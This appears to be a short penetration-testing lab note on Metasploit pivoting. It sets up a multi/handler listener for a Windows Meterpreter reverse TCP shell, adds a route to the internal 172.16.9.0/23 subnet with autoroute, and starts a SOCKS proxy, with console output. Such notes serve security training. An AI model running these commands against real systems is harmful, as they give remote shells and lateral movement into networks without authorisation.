
### meterpeter session/pivot setup
`can be ran with HANDLER.RC scripts`
```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.16.42
set LPORT 8001
exploit
```

`sudo msfconsole -r handler.rc`

### 2. add route to .9.0/23 subnet
`meterpreter>`
```
run autoroute -s 172.16.9.0/23
```
view actove routes
```
meterpreter> run autoroute -p 
or bg
route print
```

set up a socks proxy which is the final step before we can communica with the `172.16.9.0/23` network from our attack host.
```shell-session
use auxiliary/server/socks_proxy
```

```shell-session
Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set srvport 9050
srvport => 9050
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set version 4a
version => 4a
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.
[msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> 
[*] Starting the SOCKS proxy server
```